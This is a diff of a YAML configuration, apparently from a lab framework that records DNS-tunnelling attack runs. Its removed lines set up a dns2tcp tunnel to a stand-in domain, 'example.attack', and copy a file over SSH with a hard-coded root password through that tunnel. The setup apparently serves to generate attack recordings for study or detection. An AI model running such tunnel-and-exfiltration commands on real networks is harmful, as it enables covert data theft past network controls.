@@ -10,7 +10,6 @@ dns_attack_server:
     run:
         type: shell
         val: |-
-          sudo apt install -y socat;
           nohup asciinema rec /tmp/dns2tcp_server_{{ variables.record_type }}.cast -c \'set -x; dns2tcpd -d 1 -f /opt/dns2tcpdrc & sleep 1\'
     artifacts_to_collect:
       - type: files
@@ -28,14 +27,10 @@ dns_attack_client:
     run:
         type: shell
         val: >-
-          set -x;
-          dns2tcpc -z example.attack -k {{ variables.passphrase }} 127.0.0.1 -r ssh -l 12345 {{ variables.compression }} -T {{ variables.record_type }} & sleep 1;
-          rsync -P --rsh="sshpass -p root ssh -l root -oStrictHostKeyChecking=no -p 12345" 127.0.0.1:/root/test-file /tmp/
+          echo "Executing manual C2 here with param: " {{ variables.record_type }}  {{ variables.compression }}
     artifacts_to_collect:
       - type: files
         val: ["/tmp/*.cast"]
-      - type: cli_recording
-        val: ["/tmp/dns2tcp_client_{{ variables.record_type }}_{{ 'compressed' if variables.compression=='-c' else 'noncompressed' }}_{{ variables.passphrase }}.cast"]
 
     variables:
         - record_type: ["TXT", "KEY"]
